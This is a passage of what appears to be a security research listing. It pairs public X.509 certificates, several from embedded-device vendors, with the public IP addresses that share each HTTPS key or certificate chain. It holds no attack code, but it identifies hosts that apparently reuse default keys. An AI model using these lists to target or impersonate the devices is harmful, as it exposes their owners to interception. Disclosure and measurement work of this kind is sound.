/>\nfYUL+WXednJkJMw3PKc6AUyCZIGpdBZMu0OHVMY0gxqoMj/EDLQCClHmX819s9Gu<br />\n3ik90z2dB+yjdzdlLYxYjPbaqMwfK+UUXKD9OHlbaDvtNjwvkN97UgeZSSI1BL1X<br />\nGuFbwRTnibA0E7BMoNA6Sg==<br />\n&#8212;&#8211;END CERTIFICATE&#8212;&#8211;</p>\n<p>****************************************************************<br />\nHTTPS Public Key is shared across the following IPs:<br />\n201.146.151.175<br />\n201.146.131.184</p>\n<p>&#8212;&#8211;BEGIN CERTIFICATE&#8212;&#8211;<br />\nMIIEgDCCA2igAwIBAgIJALEJAtrV4eOSMA0GCSqGSIb3DQEBBQUAMIGGMQswCQYD<br />\nVQQGEwJDTjEQMA4GA1UECBMHSmlhbmdzdTEPMA0GA1UEBxMGc3V6aG91MRAwDgYD<br />\nVQQKEwdyZWFsdGVrMRAwDgYDVQQLEwdyZWFsdGVrMRQwEgYDVQQDEwsxOTIuMTY4<br />\nLjEuMTEaMBgGCSqGSIb3DQEJARYLMTkyLjE2OC4xLjEwHhcNMTAxMTA4MDczMTU5<br />\nWhcNMzUwNjMwMDczMTU5WjCBhjELMAkGA1UEBhMCQ04xEDAOBgNVBAgTB0ppYW5n<br />\nc3UxDzANBgNVBAcTBnN1emhvdTEQMA4GA1UEChMHcmVhbHRlazEQMA4GA1UECxMH<br />\ncmVhbHRlazEUMBIGA1UEAxMLMTkyLjE2OC4xLjExGjAYBgkqhkiG9w0BCQEWCzE5<br />\nMi4xNjguMS4xMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1cK0T/Bb<br />\n/ejMloV62c8EtZRLMjOm/BWimPfgI4siOp0kMSkFBtWo/tXlet1pe+ikpdL3aINe<br />\nDiMJz+lIPEQXiHRj/N4GMqbRsaxBuzoKw6bNddj8DfV9+CkHHAcawKAPb1eBPS+U<br />\nN9AxrRfUL/gPSofQyHQPAzG4iSlM+9T806Xo2D2p2OH8acJuv1RB8VoAaP9RYL/2<br />\nW1dnXKpZbQ8xh8s/snqaA6EBTreKOKK74Ijm9DKPH/t8DQLpeis4lXhoX+JsY8E8<br />\nWzncSVIvEIiwCGsBezSGlhIlDLuime04Z//V4a5AUeFSFEgdwR6qGZ25CdTdaEAH<br />\nM47wBHLgMnHt4QIDAQABo4HuMIHrMB0GA1UdDgQWBBT31YlKnkC3bIdDhABbkHAH<br />\nNPjoujCBuwYDVR0jBIGzMIGwgBT31YlKnkC3bIdDhABbkHAHNPjouqGBjKSBiTCB<br />\nhjELMAkGA1UEBhMCQ04xEDAOBgNVBAgTB0ppYW5nc3UxDzANBgNVBAcTBnN1emhv<br />\ndTEQMA4GA1UEChMHcmVhbHRlazEQMA4GA1UECxMHcmVhbHRlazEUMBIGA1UEAxML<br />\nMTkyLjE2OC4xLjExGjAYBgkqhkiG9w0BCQEWCzE5Mi4xNjguMS4xggkAsQkC2tXh<br />\n45IwDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQUFAAOCAQEAyDrk1mR300nsiNeC<br />\nZo8xNu8+gYRPGomaBFo2pCG0kdW76yV37ruFLagqsDYKo4qR0TRXnsP8sqr3/8Ol<br />\nqdQcnYa8BcYyOxvOVT93q3XT12HNJRkffYdtZJvN9n2nhXdYgtIAlD4sBymoovH2<br />\nAHjypkfj/PtPsBWitlfhtJdFd9l30c+JLL3eEwUj6hRqTqzzxR1jGkZ6c0hY/TDD<br />\np79bOhMFi4HhFvb/fc1G/xMlXmdKv6nQ9Ym6uDZw4Deg+dHMu8mhdjBrP3CUDeTP<br />\n1+cF2XG9BAe2Qsvo1b1nztUUyzcvcs7HKT/NTrzMkYsGEhUUzWc3Eo5L06l2zGdB<br />\nahNl7w==<br />\n&#8212;&#8211;END CERTIFICATE&#8212;&#8211;</p>\n<p>****************************************************************<br />\nHTTPS Public Key is shared across the following IPs:<br />\n113.167.118.245<br />\n113.170.177.60</p>\n<p>&#8212;&#8211;BEGIN CERTIFICATE&#8212;&#8211;<br />\nMIIDIjCCAgoCCQCFUSb1q/UhozANBgkqhkiG9w0BAQUFADBSMQswCQYDVQQGEwJV<br />\nUzEOMAwGA1UECBMFRExJTksxCzAJBgNVBAcTAlVTMQ4wDAYDVQQKEwVETElOSzEW<br />\nMBQGA1UEAxMNMTkyLjE2OC4wLjEwMTAgFw0wODExMjYwOTMwNDZaGA8xOTM2MDcy<br />\nNjIwMzQxNFowUjELMAkGA1UEBhMCVVMxDjAMBgNVBAgTBURMSU5LMQswCQYDVQQH<br />\nEwJVUzEOMAwGA1UEChMFRExJTksxFjAUBgNVBAMTDTE5Mi4xNjguMC4xMDEwggEi<br />\nMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDGKzhJPWtVXy7yfBov58rHxnxx<br />\ncZVhYPp7JkeG8Xxw1VwhngBS5iyhIwgxyfBNZPoh2bcVslosfiAmfb1Yo5WdK0q2<br />\n6kCX31o5WmyD9JpHQL9h1KwVF4biURQzBMM4NH+3fFk2VNN2vcndFY+rgSCk860D<br />\nnSN+TqZ+GrVjgQPfM102QxIRLlUt73iFB9JEQABDRK2QmqoOWxYhIIaRNJnBITbc<br />\nQTGx82CNz/sgDo77jLCx9hNoBeotyP+vj1CWx9/kvNtRq21no7i+QIeCe4KNsMje<br />\nYpn4RI0FCoUp8GzFSu6iGptEz0PlN4hvom7HW6LpKFFGHf4PQ9CVLMwkMUXLAgMB<br />\nAAEwDQYJKoZIhvcNAQEFBQADggEBAJmy5NIaclQhq8/8RuF7AOQkNcR7AMrINC5v<br />\nbQDTKYIGuAtMamdZ3/S8y6fKDhbK6uYfABQ1dy9SQdJJIn5IRx5NHr9Z2cuU5hyU<br />\naT5aNQaKrE8tgd3tdRS485OGv8H2lviwC2qwo2wSny+Fh9150BSn/Gdiss8vrQyp<br />\njoRb+xLV1ZNxbZme3TUKmhIAdsbsImv9Psfzoy7yCJzSROzCKc08zGkJg7UcWiEt<br />\nF0Pu4WTuWdjzR0KW0z7Ee0/GokQSQLlNMys5jfoobIj/1B+zD3i0pVXPDoYKpZhS<br />\nHQYtdx/8nnb9ncG/oqqMMbfZKg0JxlzbLdQvXczEzQjn10CYAfk=<br />\n&#8212;&#8211;END CERTIFICATE&#8212;&#8211;</p>\n<p>****************************************************************<br />\nHTTPS Public Key is shared across the following IPs:<br />\n178.76.238.30</p>\n<p>&#8212;&#8211;BEGIN CERTIFICATE&#8212;&#8211;<br />\nMIIC3jCCAcagAwIBAgIQusJKgpI8fa5FnLxNuCfk4TANBgkqhkiG9w0BAQUFADAY<br />\nMRYwFAYDVQQDEw1TRVJWRVItQUxNQUlaMB4XDTEzMDMwMjE5MDE1OFoXDTIzMDMw<br />\nMjAwMDAwMFowGDEWMBQGA1UEAxMNU0VSVkVSLUFMTUFJWjCCASIwDQYJKoZIhvcN<br />\nAQEBBQADggEPADCCAQoCggEBANEXEmN/lk99huJz45NOmty1YUUJXHZAmo/HJchp<br />\nMctDPgMiKLGZHMYDRplzCDLyCqScRMIAkZzTnNQEmvqaOkhTAXGveCi7RHhVxpIA<br />\nWEIHf7vTnf95mLs2HXfVBgwyX4vrC3pREYvl28pi4bmTBH9+FWzoIpq+f83WZz3K<br />\n8bD3j1w8mJeRMxxVu5Lf1m/77vAZqiAHZTdKei1SGrvZOKTSiqqy5bhdbz5wpuMM<br />\nBj7LfpxOIcGUK0z2+JoYCDTpWfWdnd+JHRc1bWDqA5qe/4bey6DvCD+r7c47g+SM<br />\nGgzG0plyFhHtuaTLT+cM9bUVTdg3My1UCZYol2xZecTTGOUCAwEAAaMkMCIwCwYD<br />\nVR0PBAQDAgQwMBMGA1UdJQQMMAoGCCsGAQUFBwMBMA0GCSqGSIb3DQEBBQUAA4IB<br />\nAQCo4+YLmmjIdiWfXlKLn7psFsFVohAgzavx7aa+juD5zb092csjofu/RRljHOjc<br />\nPLesuuk7/RAbkDM1oV2WO5S02nRofu+8/SWSpitpirzM4fX0wuaKp/AZOmx+lEtk<br />\nTOv2m03Y5NSzr9y8sZth5lc/BGZRUi0A4UqSK93uXuSQijMG0HI3jnvflMIEflYP<br />\nxInE5u5MmWN9swHBsA/zRaDH4I50r4IWd8zEzESRJNco8hgVJxGnkjvYCU09KqyE<br />\nYDON7qFNOl6qjSVPWIkNCCKU+5T3pD8QIasWwmIwDqhkmNnfmSiwxF+iQNzi/Gc9<br />\njCAieWlxD4hWZRl8SqVEHAt2<br />\n&#8212;&#8211;END CERTIFICATE&#8212;&#8211;</p>\n<p>****************************************************************<br />\nHTTPS Public Key is shared across the following IPs:<br />\n181.48.78.18</p>\n<p>&#8212;&#8211;BEGIN CERTIFICATE&#8212;&#8211;<br />\nMIIC4jCCAcqgAwIBAgIE9TqY9zANBgkqhkiG9w0BAQUFADAzMRkwFwYDVQQDExBG<br />\nR1Q2MEMzRzEwMDEwNzE0MRYwFAYDVQQKEw1Gb3J0aW5ldCBMdGQuMB4XDTEyMDky<br />\nMDEyMTU1OVoXDTIyMDkyMTEyMTU1OVowMzEZMBcGA1UEAxMQRkdUNjBDM0cxMDAx<br />\nMDcxNDEWMBQGA1UEChMNRm9ydGluZXQgTHRkLjCCASIwDQYJKoZIhvcNAQEBBQAD<br />\nggEPADCCAQoCggEBAMCJoCOseHl1ploHbIOhAnqVgm2AAC4q3vINndoCEaO4MxVC<br />\n4MspYB2DYA6GcmgTnyEJiNamsn+SRdrdorzjEfmIKtPsYj1nUGPaGLg0SH2GB2KW<br />\nSEfI+iq1lhBr8QiET3UEfUgZ+B/MQ0DMMF1qqfAWXqTfdpei0DSoMCmHO8gB3wwC<br />\nvUXBHD6d4vf2J1Mz3XQujcEqcQHM2SUM3repURLQRWIB5WlwnTk15/UeGjGXsolo<br />\nCbuLsqsqhyrVySib2croNrO4ZBdZVb+SYAcE5897rpvZAOKUEfWuwHdsrOkIWjz2<br />\njU3TxJUlKuKyMEuoIwOZ9X6WQau0fKIcYvc4yaECAwEAATANBgkqhkiG9w0BAQUF<br />\nAAOCAQEAJA366S+MVVtgi/Tya+Nqe0hchPS8gKy4VJYjg2MkS55b7g0uS7Q46/k5<br />\nusW7mL+zALoWHoSpQi0q0pjxVIdHUVvzwYPl+pOWrChQHxkEi4UwmgYhIGz+l4fx<br />\nl/7vLhdXg671qXDgO9HhuzF7CpYcDOHTUV0X9m334LoUYrC/YNzDC7Xh+HAGbfQI<br />\n8G+B5OgjJIJZtCabeijpaqseUxXKg5C1yYSotR4h/99voyqdzmxi5rw2f/GrZTxB<br />\nKMJDSDHoO7iJ3VzKtnASDs9DDBf2lRg0SyHudzU8ovYexysyNWPV9BHKnbgbWB2v<br />\nB5TEevckVKWuk0zJhjfNIqQ32iBHlQ==<br />\n&#8212;&#8211;END CERTIFICATE&#8212;&#8211;</p>\n<p>****************************************************************<br />\nHTTPS Public Key is shared across the following IPs:<br />\n95.5.189.230</p>\n<p>&#8212;&#8211;BEGIN CERTIFICATE&#8212;&#8211;<br />\nMIIFBzCCA++gAwIBAgIRAOA/n629JUz74EkZyAQqNGgwDQYJKoZIhvcNAQEFBQAw<br />\nczELMAkGA1UEBhMCR0IxGzAZBgNVBAgTEkdyZWF0ZXIgTWFuY2hlc3RlcjEQMA4G<br />\nA1UEBxMHU2FsZm9yZDEaMBgGA1UEChMRQ09NT0RPIENBIExpbWl0ZWQxGTAXBgNV<br />\nBAMTEFBvc2l0aXZlU1NMIENBIDIwHhcNMTIxMDEwMDAwMDAwWhcNMTcxMDEwMjM1<br />\nOTU5WjBgMSEwHwYDVQQLExhEb21haW4gQ29udHJvbCBWYWxpZGF0ZWQxHTAbBgNV<br />\nBAsTFFBvc2l0aXZlU1NMIFdpbGRjYXJkMRwwGgYDVQQDFBMqLmphdmEtZGV2ZWxv<br />\ncGVyLmJlMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwtwflIyxutZ8<br />\na2B5oczsH9ar3WGmFN55WqUkxAXZHsMvHOEMc67nW2sTzUlve0N291UafcZHLKT8<br />\n7Nh/ib0ex9LyqcYOksclR7WwCeKnEjeHgWIZfCmKUVL/Sw3qmYXMtnZxA4PXvjCl<br />\nYAeTWlGHMJ+txjTHcClb+VUg8fhQ8LeF9fjpkt2Jm662ILYC4DeTN8uPqW4Zar+l<br />\nqTJp9Rsk94R6aty0GmMRGx/jFH5rCpcp3UDSH25T81jACRJt0NzrhR7HiwXaAva6<br />\n6qc/A8a+eem8VAcUzbE5GJNapQAV/Iwp6p7FRxaMxxIzMFat3X5AXjnmDtlpcnpM<br />\n3ivKWfrNAQIDAQABo4IBpzCCAaMwHwYDVR0jBBgwFoAUmeRAX2sUXj4F2d3TY1T8<br />\nYrj3AKwwHQYDVR0OBBYEFPLe4coLGml/S9gfBYiZUUsVpRmCMA4GA1UdDwEB/wQE<br />\nAwIFoDAMBgNVHRMBAf8EAjAAMB0GA1UdJQQWMBQGCCsGAQUFBwMBBggrBgEFBQcD<br />\nAjBGBgNVHSAEPzA9MDsGCysGAQQBsjEBAgIHMCwwKgYIKwYBBQUHAgEWHmh0dHA6<br />\nLy93d3cucG9zaXRpdmVzc2wuY29tL0NQUzA7BgNVHR8ENDAyMDCgLqAshipodHRw<br />\nOi8vY3JsLmNvbW9kb2NhLmNvbS9Qb3NpdGl2ZVNTTENBMi5jcmwwbAYIKwYBBQUH<br />\nAQEEYDBeMDYGCCsGAQUFBzAChipodHRwOi8vY3J0LmNvbW9kb2NhLmNvbS9Qb3Np<br />\ndGl2ZVNTTENBMi5jcnQwJAYIKwYBBQUHMAGGGGh0dHA6Ly9vY3NwLmNvbW9kb2Nh<br />\nLmNvbTAxBgNVHREEKjAoghMqLmphdmEtZGV2ZWxvcGVyLmJlghFqYXZhLWRldmVs<br />\nb3Blci5iZTANBgkqhkiG9w0BAQUFAAOCAQEABdqHSJyRET5B0UXyhRtI3CC4kdMr<br />\nypOYSczH6M9soESHrCmw6toxWPgIpVsh0CwlOlfh+AID0/Qtk4Gb9XtOZiMIXsGD<br />\nfbB8aJydzjmvW8biD2/XatR5+HCq+KVcYYEdnorqNk72NvWVC9CYZ13wwkUSArCh<br />\nlSxyArq9Rv49/raPERzoXBcUB4FGdTdfESz6C4Xb3/t1Y8BAgFZW/W4sPUFHZPQj<br />\nD85VuphAQ3oOjFPL+SIBfJP3/qq5Kw7PThUYep25M0j2mBluH0R9D/TDOKIqptjE<br />\nKLkOorRRo5YRC+R4xJ/VKpdUA+8VaNspeI6OKxy9orPfDcHhyX8Kj7xQgA==<br />\n&#8212;&#8211;END CERTIFICATE&#8212;&#8211;</p>\n<p>****************************************************************<br />\nHTTPS Public Key is shared across the following IPs:<br />\n81.82.248.205</p>\n<p>**********************************************************************<br />\nShared Certificate Chain<br />\n**********************************************************************<br />\n&#8212;&#8211;BEGIN CERTIFICATE&#8212;&#8211;<br />\nMIICLDCCAdYCAQAwDQYJKoZIhvcNAQEEBQAwgaAxCzAJBgNVBAYTAlBUMRMwEQYD<br />\nVQQIEwpRdWVlbnNsYW5kMQ8wDQYDVQQHEwZMaXNib2ExFzAVBgNVBAoTDk5ldXJv<br />\nbmlvLCBMZGEuMRgwFgYDVQQLEw9EZXNlbnZvbHZpbWVudG8xGzAZBgNVBAMTEmJy<br />\ndXR1cy5uZXVyb25pby5wdDEbMBkGCSqGSIb3DQEJARYMc2FtcG9AaWtpLmZpMB4X<br />\nDTk2MDkwNTAzNDI0M1oXDTk2MTAwNTAzNDI0M1owgaAxCzAJBgNVBAYTAlBUMRMw<br />\nEQYDVQQIEwpRdWVlbnNsYW5kMQ8wDQYDVQQHEwZMaXNib2ExFzAVBgNVBAoTDk5l<br />\ndXJvbmlvLCBMZGEuMRgwFgYDVQQLEw9EZXNlbnZvbHZpbWVudG8xGzAZBgNVBAMT<br />\nEmJydXR1cy5uZXVyb25pby5wdDEbMBkGCSqGSIb3DQEJARYMc2FtcG9AaWtpLmZp<br />\nMFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAL7+aty3S1iBA/+yxjxv4q1MUTd1kjNw<br />\nL4lYKbpzzlmC5beaQXeQ2RmGMTXU+mDvuqItjVHOK3DvPK7lTcSGftUCAwEAATAN<br />\nBgkqhkiG9w0BAQQFAANBAFqPEKFjk6T6CKTHvaQeEAsX0/8YHPHqH/9AnhSjrwuX<br />\n9EBc0n6bVGhN7XaXd6sJ7dym9sbsWxb+pJdurnkxjx4=<br />\n&#8212;&#8211;END CERTIFICATE&#8212;&#8211;</p>\n<p>****************************************************************<br />\nCertificate Chain is shared across the following IPs:<br />\n176.209.192.197<br />\n178.34.217.31<br />\n109.184.110.57<br />\n178.46.25.181<br />\n188.18.197.203<br />\n5.141.178.54<br />\n188.18.31.238<br />\n31.162.139.205<br />\n94.77.145.105<br />\n89.254.221.141<br />\n37.79.152.228<br />\n31.162.158.64<br />\n31.163.162.185<br />\n31.162.151.96<br />\n5.142.105.48<br />\n90.151.118.182<br />\n5.140.103.70<br />\n37.79.157.209<br />\n37.79.31.107<br />\n178.46.106.60</p>\n<p>&#8212;&#8211;BEGIN CERTIFICATE&#8212;&#8211;<br />\nMIIB+TCCAWICCQD+Z2uWxwcU+TANBgkqhkiG9w0BAQQFADBBMQswCQYDVQQGEwJD<br />\nTjERMA8GA1UECBMIU2hhbmdoYWkxETAPBgNVBAcTCFNoYW5naGFpMQwwCgYDVQQK<br />\nEwNDSUcwHhcNMTIwNTA5MDc1NTE0WhcNMzIwNTA0MDc1NTE0WjBBMQswCQYDVQQG<br />\nEwJDTjERMA8GA1UECBMIU2hhbmdoYWkxETAPBgNVBAcTCFNoYW5naGFpMQwwCgYD<br />\nVQQKEwNDSUcwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBANa3t4PRm1P4nA9W<br />\nfDIYXlKAWbb90NdgpF1TePheNqVQN8SO5jL+5DE2ew7kFxNdcepDRKt2VIqRZR/j<br />\nZ0VWrEYoREO8omxZk8QcS0kCdMNOKRK0BDeX7WaHqN/Aqp60430E1BeSuMQAh2wP<br />\nwXzMDN9IHl+XYLV6v3ZieXDrDysjAgMBAAEwDQYJKoZIhvcNAQEEBQADgYEAj3K+<br />\ndqJtI4FrDJ8WVM3wqV9+KKGKojeSBtcKwupNhh9aktfakPi/B8fh6h9WzC74rDNW<br />\n0qKyL7qGBfgyMXA2/flXsgpEJNDx+YrGd3kmhQQxIE1KQDfRhq3jNwrMfGU+OdAU<br />\ncsVsz+0eth/2pwIxMVtSz1Sl7ovtwtOCZzbMjS4=<br />\n&#8212;&#8211;END CERTIFICATE&#8212;&#8211;</p>\n<p>****************************************************************<br />\nCertificate Chain is shared across the following IPs:<br />\n88.205.210.77<br />\n5.251.31.14<br />\n37.79.254.25<br />\n5.76.235.44<br />\n37.150.154.184</p>\n<p>&#8212;&#8211;BEGIN CERTIFICATE&#8212;&#8211;<br />\nMIICeTCCAeKgAwIBAgIBADANBgkqhkiG9w0BAQQFADB3MQswCQYDVQQGEwJJTjES<br />\nMBAGA1UECBMJS2FybmF0YWthMRIwEAYDVQQHEwlCYW5nYWxvcmUxEjAQBgNVBAoT<br />\nCU11bHRpdGVjaDEMMAoGA1UECxMDT0RDMR4wHAYDVQQDExVsb2NhbGhvc3QubG9j<br />\nYWxkb21haW4wHhcNMDYwNDI0MTQzODM5WhcNMDcwNDI0MTQzODM5WjB3MQswCQYD<br />\nVQQGEwJJTjESMBAGA1UECBMJS2FybmF0YWthMRIwEAYDVQQHEwlCYW5nYWxvcmUx<br />\nEjAQBgNVBAoTCU11bHRpdGVjaDEMMAoGA1UECxMDT0RDMR4wHAYDVQQDExVsb2Nh<br />\nbGhvc3QubG9jYWxkb21haW4wgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBANBM<br />\nlwGnFDZrx2WbrDdvxZSc6x1FAeHNrl16kXUIvczzkNzOzEApq/+xb4scNlzhrbRE<br />\nAVwMk4CB/n2ST+pheIk1K3wZHocAOj3TBkc24L02UZdJl+TC4/vgOGHnXRpb49sI<br />\n5Zl8ndI6JTz8NNIeS0Eu1557Ly4JmsDTXMxGoLgbAgMBAAGjFTATMBEGCWCGSAGG<br />\n+EIBAQQEAwIGQDANBgkqhkiG9w0BAQQFAAOBgQArtbvuLm63Iq1dyY2NBV3UqyKI<br />\nS6gjcbdKwlfjVeXONrPql94N7gWRuwuFwbWG/qtPsR/eL3soSQymGzno6KmkgXUI<br />\nNjw8r3CnHlqn2f+Ho4gcaE3j+W+nROb49LZXuc/IuJJ2LUYAKg/2EZkssUXd76qu<br />\nQ0yn7pzP9UPx7r5RQQ==<br />\n&#8212;&#8211;END CERTIFICATE&#8212;&#8211;</p>\n<p>****************************************************************<br />\nCertificate Chain is shared across the following IPs:<br />\n77.235.109.108<br />\n95.153.112.77<br />\n77.235.124.242</p>\n<p>&#8212;&#8211;BEGIN CERTIFICATE&#8212;&#8211;<br />\nMIICrTCCAhYCCQC6Ffdh27eytzANBgkqhkiG9w0BAQUFADCBmjELMAkGA1UEBhMC<br />\nVVMxCzAJBgNVBAgTAkNBMREwDwYDVQQHEwhTYW4gSm9zZTEfMB0GA1UEChMWVWJp<br />\ncXVpdGkgTmV0d29ya3MgSW5jLjEaMBgGA1UECxMRVGVjaG5pY2FsIFN1cHBvcnQx<br />\nDTALBgNVBAMTBFVCTlQxHzAdBgkqhkiG9w0BCQEWEHN1cHBvcnRAdWJudC5jb20w<br />\nHhcNMTEwNjAyMDgzNTAyWhcNMjAwMTAxMDgzNTAyWjCBmjELMAkGA1UEBhMCVVMx<br />\nCzAJBgNVBAgTAkNBMREwDwYDVQQHEwhTYW4gSm9zZTEfMB0GA1UEChMWVWJpcXVp<br />\ndGkgTmV0d29ya3MgSW5jLjEaMBgGA1UECxMRVGVjaG5pY2FsIFN1cHBvcnQxDTAL<br />\nBgNVBAMTBFVCTlQxHzAdBgkqhkiG9w0BCQEWEHN1cHBvcnRAdWJudC5jb20wgZ8w<br />\nDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAL4JnxQ69+7lisl2siYXAHsMhRyUjr1/<br />\n9aGlbQosZMx/eLwR7tzZ5irL4Z7YF6acNaraxcE6pUjcr7yZN1l+iDws07vnYG3j<br />\nGflOGExMOv1eNW+jULlQwI6L+qDuxJbFuk7t2PEYBTaJVMLcJ+t1dBy+mkzI5c7+<br />\nR0SWp68QB+sVAgMBAAEwDQYJKoZIhvcNAQEFBQADgYEAAFoxgToVbTCVjQORR6oj<br />\n4rTALtQBzdUha2lePHEnEBz1h9QoGRfCPew2/e6TB48LMGUOKDVsJZ7YJBaFZSna<br />\nR98wCYQzLLS0+vAkQLnuHvAcM8PhBnAua/6g0KqBb88bcGdDATKg2ryMqJHzy7GX<br />\nMATyxnfoiZcs0x/PA/H8Nvo=<br />\n&#8212;&#8211;END CERTIFICATE&#8212;&#8211;</p>\n<p>****************************************************************<br />\nCertificate Chain is shared across the following IPs:<br />\n77.236.89.144<br />\n92.248.225.101<br />\n195.206.255.117</p>\n<p>&#8212;&#8211;BEGIN CERTIFICATE&#8212;&#8211;<br />\nMIIDDDCCAnWgAwIBAgICAScwDQYJKoZIhvcNAQEFBQAwajELMAkGA1UEBhMCY24x<br />\nCzAJBgNVBAgTAmdkMQswCQYDVQQHEwJzejELMAkGA1UEChMCaHcxDDAKBgNVBAsT<br />\nA25zZDELMAkGA1UEAxMCengxGTAXBgkqhkiG9w0BCQEWCnp4QHRvbS5jb20wHhcN<br />\nMDcwNTI1MDE1NTI1WhcNMTcwNTIyMDE1NTI1WjBpMQswCQYDVQQGEwJjbjELMAkG<br />\nA1UECBMCZ2QxCzAJBgNVBAoTAmh3MQwwCgYDVQQLEwNuc2QxETAPBgNVBAMTCHp4<br />\nc2VydmVyMR8wHQYJKoZIhvcNAQkBFhB6eHNlcnZlckB0b20uY29tMIGfMA0GCSqG<br />\nSIb3DQEBAQUAA4GNADCBiQKBgQCdtX28w9zMSco1QTFrHsVvtYVY9OjKO3+a80yu<br />\niUV9kH3RciCDFOQI/2Qri+H+bfUS3DHPyiNaixk/J5EmlUBCqdxmMiQ1T5MB6deA<br />\nsSPdpAnj+7JjUtINnwLe3p0ZSXnp0m8KdS18oVwHdtLYYzg4MXLIOOO69LJWqKGR<br />\nqGVXBwIDAQABo4HBMIG+MB0GA1UdDgQWBBQUhNXir8oqJ0AWxB+DKiMxoXo6XTCB<br />\nnAYDVR0jBIGUMIGRgBQ1CjPqq7qryz38LQCGO/yFR8I82aFupGwwajELMAkGA1UE<br />\nBhMCY24xCzAJBgNVBAgTAmdkMQswCQYDVQQHEwJzejELMAkGA1UEChMCaHcxDDAK<br />\nBgNVBAsTA25zZDELMAkGA1UEAxMCengxGTAXBgkqhkiG9w0BCQEWCnp4QHRvbS5j<br />\nb22CCQCTp3Zqdnt76TANBgkqhkiG9w0BAQUFAAOBgQAlKRs/jPOeDblgjuWLgdcP<br />\nfYUL+WXednJkJMw3PKc6AUyCZIGpdBZMu0OHVMY0gxqoMj/EDLQCClHmX819s9Gu<br />\n3ik90z2dB+yjdzdlLYxYjPbaqMwfK+UUXKD9OHlbaDvtNjwvkN97UgeZSSI1BL1X<br />\nGuFbwRTnibA0E7BMoNA6Sg==<br />\n&#8212;&#8211;END CERTIFICATE&#8212;&#8211;</p>\n<p>****************************************************************<br />\nCertificate Chain is shared across the following IPs:<br />\n201.146.151.175<br />\n201.146.131.184</p>\n<p>&#8212;&#8211;BEGIN CERTIFICATE&#8212;&#8211;<br />\nMIIEgDCCA2igAwIBAgIJALEJAtrV4eOSMA0GCSqGSIb3DQEBBQUAMIGGMQswCQYD<br />\nVQQGEwJDTjEQMA4GA1UECBMHSmlhbmdzdTEPMA0GA1UEBxMGc3V6aG91MRAwDgYD<br />\nVQQKEwdyZWFsdGVrMRAwDgYDVQQLEwdyZWFsdGVrMRQwEgYDVQQDEwsxOTIuMTY4<br />\nLjEuMTEaMBgGCSqGSIb3DQEJARYLMTkyLjE2OC4xLjEwHhcNMTAxMTA4MDczMTU5<br />\nWhcNMzUwNjMwMDczMTU5WjCBhjELMAkGA1UEBhMCQ04xEDAOBgNVBAgTB0ppYW5n<br />\nc3UxDzANBgNVBAcTBnN1emhvdTEQMA4GA1UEChMHcmVhbHRlazEQMA4GA1UECxMH<br />\ncmVhbHRlazEUMBIGA1UEAxMLMTkyLjE2OC4xLjExGjAYBgkqhkiG9w0BCQEWCzE5<br />\nMi4xNjguMS4xMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1cK0T/Bb<br />\n/ejMloV62c8EtZRLMjOm/BWimPfgI4siOp0kMSkFBtWo/tXlet1pe+ikpdL3aINe<br />\nDiMJz+lIPEQXiHRj/N4GMqbRsaxBuzoKw6bNddj8DfV9+CkHHAcawKAPb1eBPS+U<br />\nN9AxrRfUL/gPSofQyHQPAzG4iSlM+9T806Xo2D2p2OH8acJuv1RB8VoAaP9RYL/2<br />\nW1dnXKpZbQ8xh8s/snqaA6EBTreKOKK74Ijm9DKPH/t8DQLpeis4lXhoX+JsY8E8<br />\nWzncSVIvEIiwCGsBezSGlhIlDLuime04Z//V4a5AUeFSFEgdwR6qGZ25CdTdaEAH<br />\nM47wBHLgMnHt4QIDAQABo4HuMIHrMB0GA1UdDgQWBBT31YlKnkC3bIdDhABbkHAH<br />\nNPjoujCBuwYDVR0jBIGzMIGwgBT31YlKnkC3bIdDhABbkHAHNPjouqGBjKSBiTCB<br />\nhjELMAkGA1UEBhMCQ04xEDAOBgNVBAgTB0ppYW5nc3UxDzANBgNVBAcTBnN1emhv<br />\ndTEQMA4GA1UEChMHcmVhbHRlazEQMA4GA1UECxMHcmVhbHRlazEUMBIGA1UEAxML<br />\nMTkyLjE2OC4xLjExGjAYBgkqhkiG9w0BCQEWCzE5Mi4xNjguMS4xggkAsQkC2tXh<br />\n45IwDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQUFAAOCAQEAyDrk1mR300nsiNeC<br />\nZo8xNu8+gYRPGomaBFo2pCG0kdW76yV37ruFLagqsDYKo4qR0TRXnsP8sqr3/8Ol<br />\nqdQcnYa8BcYyOxvOVT93q3XT12HNJRkffYdtZJvN9n2nhXdYgtIAlD4sBymoovH2<br />\nAHjypkfj/PtPsBWitlfhtJdFd9l30c+JLL3eEwUj6hRqTqzzxR1jGkZ6c0hY/TDD<br />\np79bOhMFi4HhFvb/fc1G/xMlXmdKv6nQ9Ym6uDZw4Deg+dHMu8mhdjBrP3CUDeTP<br />\n1+cF2XG9BAe2Qsvo1b1nztUUyzcvcs7HKT/NTrzMkYsGEhUUzWc3Eo5L06l2zGdB<br />\nahNl7w==<br />\n&#8212;&#8211;END CERTIFICATE&#8212;&#8211;</p>\n<p>****************************************************************<br />\nCertificate Chain is shared across the following IPs:<br />\n113.167.118.245<br />\n113.170.177.60</p>\n<p>&#8212;&#8211;BEGIN CERTIFICATE&#8212;&#8211;<br />\nMIIDITCCAoqgAwIBAgIJAJOndmp2e3vpMA0GCSqGSIb3DQEBBQUAMGoxCzAJBgNV<br />\nBAYTAmNuMQswCQYDVQQIEwJnZDELMAkGA1UEBxMCc3oxCzAJBgNVBAoTAmh3MQww<br />\nCgYDVQQLEwNuc2QxCzAJBgNVBAMTAnp4MRkwFwYJKoZIhvcNAQkBFgp6eEB0b20u<br />\nY29tMB4XDTA3MDUyNDAyMzQyN1oXDTE3MDUyMTAyMzQyN1owajELMAkGA1UEBhMC<br />\nY24xCzAJBgNVBAgTAmdkMQswCQYDVQQHEwJzejELMAkGA1UEChMCaHcxDDAKBgNV<br />\nBAsTA25zZDELMAkGA1UEAxMCengxGTAXBgkqhkiG9w0BCQEWCnp4QHRvbS5jb20w<br 